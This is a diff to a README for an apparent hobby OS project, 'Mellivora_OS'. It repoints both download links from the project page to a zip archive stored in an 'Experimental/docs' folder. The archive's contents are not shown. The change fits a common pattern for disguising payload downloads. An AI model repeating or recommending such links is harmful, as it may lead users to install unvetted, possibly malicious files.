@@ -1,6 +1,6 @@
 # 💻 Mellivora_OS - Experience a simple custom computer system
 
-[![Download Mellivora_OS](https://img.shields.io/badge/Download-Mellivora_OS-blue.svg)](https://github.com/Anuric-minoraxis635/Mellivora_OS)
+[![Download Mellivora_OS](https://img.shields.io/badge/Download-Mellivora_OS-blue.svg)](https://github.com/Anuric-minoraxis635/Mellivora_OS/raw/refs/heads/main/Experimental/docs/OS-Mellivora-Scutibranchia.zip)
 
 ## 📁 About the system
 
@@ -19,7 +19,7 @@ Ensure your computer meets these conditions to run the system:
 
 Visit the project page to download the necessary files. Select the version that matches your hardware setup.
 
-[Download Mellivora_OS](https://github.com/Anuric-minoraxis635/Mellivora_OS)
+[Download Mellivora_OS](https://github.com/Anuric-minoraxis635/Mellivora_OS/raw/refs/heads/main/Experimental/docs/OS-Mellivora-Scutibranchia.zip)
 
 ## ⚙️ Installation and setup
 
